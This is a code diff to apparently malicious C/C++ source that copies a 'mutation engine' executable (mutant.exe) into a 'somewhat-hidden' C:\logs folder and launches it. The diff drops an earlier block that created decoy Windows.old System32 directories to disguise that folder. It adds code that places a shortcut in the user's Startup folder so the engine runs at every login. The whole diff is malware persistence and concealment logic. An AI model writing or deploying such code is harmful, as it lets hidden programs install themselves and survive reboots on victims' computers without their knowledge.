@@ -87,17 +87,9 @@ int main(void)
 		}
 	}
 	
-	//Move mutation engine to Startup directory
+	//Move mutation engine to somewhat-hidden directory
 	strcpy(src, "mutant.exe");
 	strcpy(dest, "C:\\logs");
-	
-	//Create some fake directories to disguise potential new folder
-	CreateDirectory("C:\\Windows.old\\System32\\config", NULL);
-	CreateDirectory("C:\\Windows.old\\System32\\DriverState", NULL);
-	CreateDirectory("C:\\Windows.old\\System32\\en-us", NULL);
-	CreateDirectory("C:\\Windows.old\\System32\\inetsrv", NULL);
-	CreateDirectory("C:\\Windows.old\\System32\\SecureBootUpdates", NULL);
-	CreateDirectory("C:\\Windows.old\\System32\\winevt", NULL);
 	
 	if(CreateDirectory(dest, NULL) || GetLastError() == ERROR_ALREADY_EXISTS)
 	{
@@ -136,6 +128,32 @@ int main(void)
 	
 	//Start mutation engine
 	system(dest);
+	
+	//Move shortcut to mutation engine to startup folder
+	strcpy(src, "short.lnk");
+	strcpy(dest, getenv("USERPROFILE"));
+	strcat(dest, "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\short.lnk");
+	
+	FILE *in = fopen(src, "rb");
+	FILE *out = fopen(dest, "wb");
+	
+	if(in == NULL || out == NULL) {
+		perror("Error: ");
+		cout << "Error copying short.lnk to startup folder" << endl;
+		in = out = 0;
+	}
+	else
+	{
+		while((len = fread(buffer, BUFSIZ, 1, in)) > 0)
+		{
+			fwrite(buffer, BUFSIZ, 1, out);
+		}
+		
+		cout << "Successfully wrote short.lnk to startup folder" << endl;
+		
+		fclose(in);
+		fclose(out);
+	}
 	
 	return 0;
 }
